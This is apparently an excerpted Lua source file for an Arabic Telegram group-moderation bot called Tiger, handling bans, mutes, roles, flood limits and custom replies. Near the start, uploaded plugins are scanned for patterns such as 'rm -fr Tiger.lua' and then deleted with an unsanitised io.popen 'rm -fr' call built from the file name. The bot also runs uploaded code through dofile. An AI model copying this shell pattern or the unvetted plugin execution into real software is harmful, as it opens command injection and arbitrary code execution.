ts23kk =  "\n⚠️┇عمي صدك جذب لول وكيكو كل يوم واحد يهينهم ما شبعتو اهانات 😹😹 \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_Tiger/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
...
if (f:match('^(.*)(rm -fr Tiger.lua)(.*)$')) then 
ts23kk =  "\n⚠┇مكدر ارفع ملف يحذف ملف Tiger.lua لتبعبص ابني "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_Tiger/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(Tiger.lua)(.*)$')) then 
ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_Tiger/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
...
if (f:match('^(.*)(22Tiger%3a%22%20%2e%2e%20bot_id)(.*)$')) then 
...
if (f:match('^(.*)(2fmaster%2fTiger%2elua)(.*)$')) then 
ts23kk =  "\n⚠️┇ادري هل فروخ كيكو ولول ما يبطلون سوالفهم \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_Tiger/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
...
io.popen("rm -fr files_Tiger/del.lua")
io.popen("rm -fr files_Tiger/hack.lua")
io.popen("rm -fr files_Tiger/d.lua")
if f ~= "keko" then
ts23 = ""
if f:match("^(.*)(keko_Tiger)(.*)$") then
if f:match("^(.*)(function send)(.*)$") then
...
function Tiger_run_file(data)
local files_Tiger = database:smembers("files"..bot_id)
for i=1,#files_Tiger do
local Tigeree = dofile("files_Tiger/"..files_Tiger[i])
local kt = Tigeree.keko_Tiger(data)
if kt == 'end' then
return false
end
end
...
local photo = database:get('Tiger:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
if photo then
local idPh = nil
...
database:del('Tiger:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
end end
...
if not database:get( 'Tiger:'..bot_id.."charge:"..msg.chat_id_) then
if database:get( 'Tiger:'..bot_id.."enable:"..msg.chat_id_) then
database:del( 'Tiger:'..bot_id.."enable:"..msg.chat_id_)
for k,v in pairs(sudo_users) do
end
end
end
...
if not database:sismember( 'Tiger:'..bot_id.."groups",msg.chat_id_) then
database:sadd( 'Tiger:'..bot_id.."groups",msg.chat_id_)
end
elseif id:match('^(%d+)') then
database:sadd('Tiger:'..bot_id.."userss",msg.chat_id_)
else
if not database:sismember( 'Tiger:'..bot_id.."groups",msg.chat_id_) then
database:sadd( 'Tiger:'..bot_id.."groups",msg.chat_id_)
end
...
database:incr('Tiger:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
if database:get('Tiger:'..bot_id..'viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
send(msg.chat_id_, msg.id_, 1, '❕┇قم بارسال المنشور من القناة', 1, 'md')
database:del('Tiger:'..bot_id..'viewget'..msg.sender_user_id_)
else
...
local Tiger_edis = {string.match(text, "^اضف امر (.*)$")}
send(msg.chat_id_, msg.id_, 1, "☑┇ ارسال الان الامر الجديد", 1, 'md')
database:set("tsahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id,Tiger_edis[1])
...
database:set("Tiger:edit:text:su:new:"..bot_id..msg.chat_id_..database:get("tsahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id),text)
database:set("Tiger:edit:text:su:new2:"..bot_id..msg.chat_id_..text,database:get("tsahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id))
...
redis:del('Tiger:'..bot_id..'text_sudo', text)
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الكليشه ', 1, 'html')
return "Tiger"
end
if text:match("^مسح امر (.*)") then 
local t = {string.match(text, "^مسح امر (.*)$")}
database:del("Tiger:edit:text:su:new2:"..bot_id..msg.chat_id_..database:get("Tiger:edit:text:su:new:"..bot_id..msg.chat_id_..t[1]))
database:del("Tiger:edit:text:su:new:"..bot_id..msg.chat_id_..t[1])
...
local hash =  'Tiger:'..bot_id..'creator:'..msg.chat_id_
...
if result.id_ then
database:sadd('Tiger:'..bot_id..'creator:'..msg.chat_id_, result.id_)
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apow[2] or 'Tigerteam')..')\n※ تم رفعة منشئ  في البوت ✓ 🤵🏻'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
...
database:sadd('Tiger:'..bot_id..'creator:'..msg.chat_id_, apow[2])
...
text = "👨‍👩‍👧‍👦 ※ قائمة المنشئين   ✓  ،\nꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ\n"
for k,v in pairs(list) do
local user_info = database:hgetall('Tiger:'..bot_id..'user:'..v)
...
---------------------------
 ...
 local res = http.request('http://Tiger.gq/xxx.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
...
function promote_by_reply(extra, result, success)
local hash =  'Tiger:'..bot_id..'mods:'..msg.chat_id_
if database:sismember(hash, result.sender_user_id_) then
...
function promote_by_username(extra, result, success)
if result.id_ then
database:sadd('Tiger:'..bot_id..'mods:'..msg.chat_id_, result.id_)
...
database:sadd('Tiger:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
...
function promote_by_reply(extra, result, success)
local hash =  'Tiger:'..bot_id..'vipgp:'..msg.chat_id_
if database:sismember(hash, result.sender_user_id_) then
...
function promote_by_username(extra, result, success)
if result.id_ then
database:sadd('Tiger:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
...
database:sadd('Tiger:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
...
database:set("tsahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'Tiger')
return "Tiger"
end
...
database:set("Tiger:gr:id:text:"..bot_id..msg.chat_id_,text)
end
if text and text == "مسح الايدي" and (is_owner(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1,  '✖┇ تم المسح بنجاح', 1, 'md')
database:del("Tiger:gr:id:text:"..bot_id..msg.chat_id_)
end
...
if not is_creator(msg) and database:get("Tiger:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
return "tshakke"
end
function ban_by_reply(extra, result, success)
local hash =  'Tiger:'..bot_id..'banned:'..msg.chat_id_
...
database:sadd('Tiger:'..bot_id..'banned:'..msg.chat_id_, result.id_)
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apba[2] or 'Tigerteam')..')\n☑┇تم حظره من المجموعه'
...
database:sadd('Tiger:'..bot_id..'banned:'..msg.chat_id_, apba[2])
...
local hash =  'Tiger:'..bot_id..'banned:'..msg.chat_id_
local hash1 =  'Tiger:'..bot_id..'banned:'..msg.chat_id_
...
if result.id_ then
database:del('Tiger:'..bot_id..'banned:'..msg.chat_id_, result.id_)
database:del('Tiger:'..bot_id..'muted:'..msg.chat_id_, result.id_)
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apba[2] or 'Tigerteam')..')\n☑┇تم تحريره من القيود'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
...
database:del('Tiger:'..bot_id..'banned:'..msg.chat_id_, apba[2])
database:del('Tiger:'..bot_id..'muted:'..msg.chat_id_, apba[2])
...
if result.id_ then
if database:sismember('Tiger:'..bot_id..'gbanned:',result.id_) then
kewd = 'محظور عام'
elseif database:sismember('Tiger:'..bot_id..'banned:'..msg.chat_id_,result.id_) then
kewd = 'محظور'
elseif database:sismember('Tiger:'..bot_id..'muted:'..msg.chat_id_,result.id_) then
kewd = 'مكتوم'
elseif database:sismember('Tiger:'..bot_id..'res'..msg.chat_id_,result.id_) then
kewd = 'مقيد'
else
kewd = ' لا يوجد'
end
...
database:set('Tiger:'..bot_id.."group:link"..msg.chat_id_,glink) 
...
if result.id_ then
database:srem('Tiger:'..bot_id..'banned:'..msg.chat_id_, result.id_)
...
database:srem('Tiger:'..bot_id..'banned:'..msg.chat_id_, apba[2])
...
if result.id_ then
local hash =  'Tiger:'..bot_id..'gbanned:'
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apbll[2] or 'Tigerteam')..')\n🚫┇تم حظره من المجموعات البوت'
database:sadd(hash, result.id_)
else
texts = '✖┇خطاء'
end
...
local hash =  'Tiger:'..bot_id..'gbanned:'
if result.id_ then
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apid[2] or 'Tigerteam')..')\n��┇تم الغاء حظره من المجموعات البوت'
database:srem(hash, result.id_)
else
texts = '✖┇خطاء'
end
...
local hash =  'Tiger:'..bot_id..'gmuted:'
database:sadd(hash, result.sender_user_id_)
...
local hash =  'Tiger:'..bot_id..'muted:'..msg.chat_id_
if ck_mod(result.sender_user_id_, msg.chat_id_) then
...
database:sadd('Tiger:'..bot_id..'muted:'..msg.chat_id_, result.id_)
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apsi[2] or 'Tigerteam')..')\n🚫┇تم كتمه من البوت'
end
else
texts = '✖┇خطاء'
end
...
database:sadd('Tiger:'..bot_id..'muted:'..msg.chat_id_, apsi[2])
...
if result.id_ then
database:srem('Tiger:'..bot_id..'muted:'..msg.chat_id_, result.id_)
...
database:srem('Tiger:'..bot_id..'muted:'..msg.chat_id_, apsi[2])
...
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apki[2] or 'Tigerteam')..')\n🚫┇تم طرده من المجموعه'
chat_kick(msg.chat_id_, result.id_)
end
else
texts = '✖┇خطاء'
...
redis:del('Tiger:'..bot_id..'sudoo'..result.sender_user_id_..'', 'no')
redis:srem('Tiger:'..bot_id..'dev', result.sender_user_id_)
database:srem('Tiger:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
database:srem('Tiger:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
database:srem('Tiger:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
database:srem('Tiger:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
database:srem('Tiger:'..bot_id..'creatorbasic:'..msg.chat_id_,result.sender_user_id_)
...
local hash =  'Tiger:'..bot_id..'owners:'..msg.chat_id_
if database:sismember(hash, result.sender_user_id_) then
...
if result.id_ then
database:sadd('Tiger:'..bot_id..'owners:'..msg.chat_id_, result.id_)
...
database:sadd('Tiger:'..bot_id..'owners:'..msg.chat_id_, apow[2])
...
-----------------------------------------------
if (text and text == "ابلاغ" and msg.reply_to_message_id_ ~= 0 and (not database:get("Tiger:mute:deleta:msg:"..bot_id..msg.chat_id_))) then 
b = database:get("Tiger:user:deleteL:msg:"..msg.chat_id_..bot_id..msg.sender_user_id_)
if b and b == os.date("%x") then 
send(msg.chat_id_, msg.id_, 1, "👤┇ لا يمكنك الابلاغ اكثر من مره في اليوم", 1, 'html')
else
database:set("Tiger:user:deleteL:msg:"..msg.chat_id_..bot_id..msg.sender_user_id_,os.date("%x"))
...
database:set("Tiger:mute:deleta:msg:"..bot_id..msg.chat_id_,"TigerE")
...
database:del("Tiger:mute:deleta:msg:"..bot_id..msg.chat_id_)
...
local Tiger_098 = 0
if database:get("Tiger:get:mod:"..bot_id..msg.chat_id_) then 
t = database:get("Tiger:get:mod:"..bot_id..msg.chat_id_)
Tiger_098 = tonumber(t2.member_count_) - tonumber(t)
end
send(msg.chat_id_, msg.id_, 1, "🔖┇عدد المجموعه\n👤┇عدد المدراء : "..t2.administrator_count_.."\n👥┇عدد الاعضاء : "..t2.member_count_.." | ("..Tiger_098..")\n🔥┇عدد المطرودين : "..t2.kicked_count_, 1, 'md')
database:set("Tiger:get:mod:"..bot_id..msg.chat_id_,t2.member_count_)   
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
...
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = database:get("Tiger:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍✈️'
elseif is_creatorbasic(msg) then
t = database:get("Tiger:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍✈️'
elseif (database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("Tiger:all_if:"..database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = database:get("Tiger:name_cre"..bot_id..msg.chat_id_) or 'منشئ  الكروب 👨🏻‍🚒'
elseif (database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("Tiger:all_if:"..database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = database:get("Tiger:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب  👩🏿‍🚀'
elseif is_mod(msg) then
t = database:get("Tiger:name_adm"..bot_id..msg.chat_id_) or ' ادمن الكروب خالي 👩🏿‍🚒'
elseif is_vip(msg) then
t = database:get("Tiger:name_vipp"..bot_id..msg.chat_id_) or 'عضو مميز  🧟‍♂'
else
t = database:get("Tiger:name_nk"..bot_id..msg.chat_id_) or 'عضو محد يحترمك 👶🏻😹' 
end
...
if not database:get('Tiger:'..bot_id..'id:mute'..msg.chat_id_) then 
local tahna = (database:get('Tiger:'..bot_id..'nummsg'..msg.chat_id_..result.sender_user_id_) or 0)
if tonumber((database:get('Tiger:'..bot_id..'add:numall'..msg.chat_id_..result.sender_user_id_) or 0)) == 0 then
nko = '0'
else
nko = (database:get('Tiger:'..bot_id..'add:numall'..msg.chat_id_..result.sender_user_id_))
end
local msgs = ((database:get('Tiger:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_) or 0) + tahna)
local edit = database:get('Tiger:'..bot_id..'user:editmsg'..msg.chat_id_..':'..result.sender_user_id_) or 0
local msg2 = msg
...
if msg.sender_user_id_ == tonumber(sudo_add) then
Tiger_oop = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg2) then
Tiger_oop = database:get("Tiger:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
elseif is_creatorbasic(msg) then
Tiger_oop = database:get("Tiger:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
elseif (database:get("Tiger:name_user:"..bot_id..msg.chat_id_..result.id_) and database:get("Tiger:all_if:"..database:get("Tiger:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
Tiger_oop = database:get("Tiger:name_user:"..bot_id..msg.chat_id_..result.id_)
elseif is_creator(msg) then
Tiger_oop = database:get("Tiger:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
elseif (database:get("Tiger:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) and database:get("Tiger:all_if:"..database:get("Tiger:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) ..bot_id..msg.chat_id_)) then 
Tiger_oop = database:get("Tiger:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_)
elseif is_owner(msg2) then
Tiger_oop = database:get("Tiger:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
elseif is_mod(msg2) then
Tiger_oop = database:get("Tiger:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
elseif is_vip(msg2) then
Tiger_oop = database:get("Tiger:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
else
Tiger_oop = database:get("Tiger:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
...
if result.id_ then
if not database:get('Tiger:'..bot_id..'id:mute'..msg.chat_id_) then 
local tahna = (database:get('Tiger:'..bot_id..'nummsg'..msg.chat_id_..result.id_) or 0)
if tonumber((database:get('Tiger:'..bot_id..'add:numall'..msg.chat_id_..result.id_) or 0)) == 0 then
nko = '0'
else
nko = (database:get('Tiger:'..bot_id..'add:numall'..msg.chat_id_..result.id_))
end
local msgs = ((database:get('Tiger:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.id_) or 0) + tahna)
local edit = database:get('Tiger:'..bot_id..'user:editmsg'..msg.chat_id_..':'..result.id_) or 0
local msg2 = msg
msg2.sender_user_id_ = result.id_
local user_msgs = ((database:get('Tiger:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.id_) or 0) + tahna)
local ikeko_text = "غير متفاعل"
if user_msgs then 
if tonumber(user_msgs) < 50 then 
ikeko_text = "غير متفاعل"
...
if text:match("^جلب صوره (%d+)$") and msg.reply_to_message_id_ == 0 and not database:get('Tiger:'..bot_id..'get:photo'..msg.chat_id_) then
...
database:set('Tiger:'..bot_id..'flood:max:'..msg.chat_id_,floodmax[2])
...
database:set('Tiger:'..bot_id.."group:link"..msg.chat_id_,text)
...
database:set('Tiger:'..bot_id..'flood:time:'..msg.chat_id_,floodt[2])
send(msg.chat_id_, msg.id_, 1, '☑┇تم  وضع الزمن التكرار للعدد ~⪼  *{'..floodt[2]..'}*', 1, 'md')
end
end
if text:match("^الرابط$") then
if not database:get("Tiger:mute:link:gr:"..bot_id..msg.chat_id_) then 
function dl_cb222( t1,t2 )
if (database:get('Tiger:'..bot_id.."group:link"..msg.chat_id_) and database:get('Tiger:'..bot_id.."group:link"..msg.chat_id_) ~= "Error") then 
send(msg.chat_id_, msg.id_, 1, '🎴※ رابط المجموعة 👩🏿‍🚒✓\n'..database:get('Tiger:'..bot_id.."group:link"..msg.chat_id_), 1, "html")
...
database:set('Tiger:'..bot_id.."group:link"..msg.chat_id_,link.result)
else 
...
database:set('Tiger:'..bot_id.."welcome"..msg.chat_id_,true)
end
...
database:del('Tiger:'..bot_id.."welcome"..msg.chat_id_)
end
...
database:set('Tiger:'..bot_id..'welcome:'..msg.chat_id_,welcome[2])
end
...
local wel = database:get('Tiger:'..bot_id..'welcome:'..msg.chat_id_)
if wel then
...
database:hset('Tiger:'..bot_id..'filters:'..msg.chat_id_, name, 'filtered')
...
database:hdel('Tiger:'..bot_id..'filters:'..msg.chat_id_, rws[2])
...
n = (n + 1)
local user_info = database:hgetall('Tiger:'..bot_id..'user:'..v.user_id_)
if user_info and user_info.username then
local username = user_info.username
...
local user_msgs = database:get('Tiger:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local tahna = (database:get('Tiger:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
...
function mute_by_reply(extra, result, success)
database:del('Tiger:'..bot_id..'nummsg'..msg.chat_id_..result.sender_user_id_)
local user_msgs = database:get('Tiger:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_)
...
add = (tonumber(database:get('Tiger:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
send(msg.chat_id_, msg.id_, 1, "📨┇عدد اضافه جهاتك ~⪼ *{"..add.."}*\n📨┇سيتم حذف العدد بعد هذه الرساله", 1, 'md')
database:del('Tiger:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if text:match("^(عدد السحكات)$") or text:match("^(سحكاتي)$") then
local edit = database:get('Tiger:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
send(msg.chat_id_, msg.id_, 1, "📮※ سحكاتك  ✓ *("..edit..")*", 1, 'md')
end
if text == 'حذف سحكاتي' then 
database:del('Tiger:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_)
local Tiger = '🗑 ※ تم حذف سحكاتك ✓'
send(msg.chat_id_, msg.id_, 1, Tiger, 1, 'md')
end
if text:match("^مسح قائمه العام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
text = '☑┇تم مسح قائمه العام'
database:del('Tiger:'..bot_id..'gbanned:')
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if text:match("^مسح المكتومين عام") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
text = '☑┇ تم مسح المكتومين عام'
database:del('Tiger:'..bot_id..'gmuted:')
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if (text:match("^(تعين عدد الاحرف) (%d+)$") and is_mod(msg)) then
Tiger_0 = {string.match(text, "^(تعين عدد الاحرف) (%d+)$")}
send(msg.chat_id_, msg.id_, 1, '☑┇ تم تعين عدد الاحرف {`'..Tiger_0[2]..'`}', 1, 'md')
database:set("Tiger:not:word:"..bot_id..msg.chat_id_,Tiger_0[2])
end
...
database:del('Tiger:'..bot_id..'banned:'..msg.chat_id_)
...
database:del('Tiger:'..bot_id..'creator:'..msg.chat_id_)
...
database:del('Tiger:'..bot_id..'mods:'..msg.chat_id_)
...
database:del('Tiger:'..bot_id..'vipgp:'..msg.chat_id_)
...
database:set("Tiger:lock:ban_and_kick"..bot_id..msg.chat_id_,"Tiger")
...
database:del("Tiger:lock:ban_and_kick"..bot_id..msg.chat_id_)
...
if database:get("lock_media:Tiger"..msg.chat_id_..bot_id) then
mute_all = '✔┇'
else
mute_all = '✖┇'
end
...
------------
if not database:get('Tiger:'..bot_id..'flood:max:'..msg.chat_id_) then
flood_m = 10
else
flood_m = database:get('Tiger:'..bot_id..'flood:max:'..msg.chat_id_)
end
if not database:get( 'Tiger:'..bot_id..'flood:time:'..msg.chat_id_) then
flood_t = 10
else
flood_t = database:get( 'Tiger:'..bot_id..'flood:time:'..msg.chat_id_)
end
------------
if database:get("lock_audeo:Tiger"..msg.chat_id_..bot_id) then
mute_music = '✔┇'
...
------------
if database:get("lock_inline:Tiger"..msg.chat_id_..bot_id) then
mute_in = '✔┇'
else
mute_in = '✖┇'
end
...
------------
if database:get("lock_edit:Tiger"..msg.chat_id_..bot_id) then
mute_edit = '✔┇'
else
mute_edit = '✖┇'
end
...
------------
if database:get("lock_pin:Tiger"..msg.chat_id_..bot_id) then
lock_pin = '✔┇'
else
lock_pin = '✖┇'
end
...
if database:get('Tiger:'..bot_id..'rep:mute'..msg.chat_id_) then
lock_rep = '✔┇'
else
lock_rep = '✖┇'
end
------------
if database:get('Tiger:'..bot_id..'repsudo:mute'..msg.chat_id_) then
lock_repsudo = '✔┇'
else
lock_repsudo = '✖┇'
end
------------
if database:get('Tiger:'..bot_id..'repowner:mute'..msg.chat_id_) then
lock_repowner = '✔┇'
else
lock_repowner = '✖┇'
end
------------
if database:get('Tiger:'..bot_id..'id:mute'..msg.chat_id_) then
lock_id = '✔┇'
else
lock_id = '✖┇'
end
------------
if database:get('Tiger:'..bot_id..'pin:mute'..msg.chat_id_) then
lock_pind = '✔┇'
else
lock_pind = '✖┇'
end
...
------------
if database:get( 'Tiger:'..bot_id.."welcome"..msg.chat_id_) then
send_welcome = '✔┇'
else
send_welcome = '✖┇'
end
------------
local ex = database:ttl( 'Tiger:'..bot_id.."charge:"..msg.chat_id_)
if ex == -1 then
exp_dat = 'لا نهائي'
else
...
local tsX_o = database:get("group_edit:Tiger"..msg.chat_id_..bot_id)
if not tsX_o then
database:set("group_edit:Tiger"..msg.chat_id_..bot_id,true)
...
local yess = redis:get('Tiger:'..bot_id..'kickyess'..msg.sender_user_id_..'')
...
if yess == 'kickyes' then
chat_kick(msg.chat_id_, msg.sender_user_id_)
redis:del('Tiger:'..bot_id..'kickyess'..msg.sender_user_id_..'', 'kickyes')
redis:del('Tiger:'..bot_id..'kicknoo'..msg.sender_user_id_..'', 'kickno')
send(msg.chat_id_, msg.id_, 1, '🕺🏿※ لقد تم طردك   ✓', 1, 'md')
end
end
end
if text:match("^لا$") then
local noo = redis:get('Tiger:'..bot_id..'kicknoo'..msg.sender_user_id_..'')
if noo == 'kickno' then
redis:del('Tiger:'..bot_id..'kickyess'..msg.sender_user_id_..'', 'kickyes')
redis:del('Tiger:'..bot_id..'kicknoo'..msg.sender_user_id_..'', 'kickno')
...
redis:del('Tiger:'..bot_id..'name_bot')
...
redis:set('Tiger:'..bot_id..'textst'..msg.sender_user_id_..'', 'msg')
return false 
else
...
if text:match("^(.*)$") then
local keko2 = redis:get('Tiger:'..bot_id..'textst'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ تم حفظ الاسم ✓', 1, 'html')
redis:set('Tiger:'..bot_id..'textst'..msg.sender_user_id_..'', 'no')
redis:set('Tiger:'..bot_id..'name_bot', text)
return false end
end
...
redis:set('Tiger:'..bot_id..'texts'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('Tiger:'..bot_id..'texts'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('Tiger:'..bot_id..'texts'..msg.sender_user_id_..'', 'no')
redis:set('Tiger:'..bot_id..'text_sudo', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
--------------------------------
if (text and text == redis:get('Tiger:'..bot_id..'name_bot'))then
name_bot = redis:get('Tiger:'..bot_id..'name_bot')
local namebot = {
...
local text_sudo = redis:get('Tiger:'..bot_id..'text_sudo')
local nkeko = redis:get('Tiger:'..bot_id..'nmkeko')
local nakeko = redis:get('Tiger:'..bot_id..'nakeko')
if text_sudo then
...
redis:set('Tiger:'..bot_id..'nkeko'..msg.sender_user_id_..'', 'msg')
return false end
end
if text:match("^+(.*)$") then
local kekoo = redis:get('Tiger:'..bot_id..'sudoo'..text..'')
local keko2 = redis:get('Tiger:'..bot_id..'nkeko'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '• `الان يمكنك ارسال الاسم الذي تريده` 🏷', 1, 'md')
redis:set('Tiger:'..bot_id..'nmkeko', text)
redis:set('Tiger:'..bot_id..'nkeko'..msg.sender_user_id_..'', 'mmsg')
return false end
end
if text:match("^(.*)$") then
local keko2 = redis:get('Tiger:'..bot_id..'nkeko'..msg.sender_user_id_..'')
...
redis:set('Tiger:'..bot_id..'nkeko'..msg.sender_user_id_..'', 'no')
redis:set('Tiger:'..bot_id..'nakeko', text)
local nmkeko = redis:get('Tiger:'..bot_id..'nmkeko')
...
if not database:get('Tiger:'..bot_id..'repowner:mute'..msg.chat_id_) then
local keko = redis:get('Tiger:'..bot_id..'keko'..text..''..msg.chat_id_..'')
if keko then 
function keko_Tiger_re(t1,t2)
local tahna = (database:get('Tiger:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = ((database:get('Tiger:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
local edit = database:get('Tiger:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local t = ""
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = database:get("Tiger:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
elseif is_creatorbasic(msg) then
t = database:get("Tiger:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
elseif (database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("Tiger:all_if:"..database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = database:get("Tiger:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
elseif (database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("Tiger:all_if:"..database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("Tiger:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = database:get("Tiger:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
elseif is_mod(msg) then
t = database:get("Tiger:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
elseif is_vip(msg) then
t = database:get("Tiger:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
else
t = database:get("Tiger:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
...
getUser(msg.sender_user_id_, keko_Tiger_re)
elseif (redis:get('Tiger:'..bot_id..':sticker:'..text..''..msg.chat_id_..'')) then 
tdcli.sendSticker(chat_id, msg.id_, 0, 1, nil, redis:get('Tiger:'..bot_id..':sticker:'..text..''..msg.chat_id_..''))
elseif (redis:get('Tiger:'..bot_id..':voice:'..text..''..msg.chat_id_..'')) then 
tdcli.sendVoice(chat_id, msg.id_, 0, 1, nil, redis:get('Tiger:'..bot_id..':voice:'..text..''..msg.chat_id_..''))
elseif (redis:get('Tiger:'..bot_id..':video:'..text..''..msg.chat_id_..'')) then 
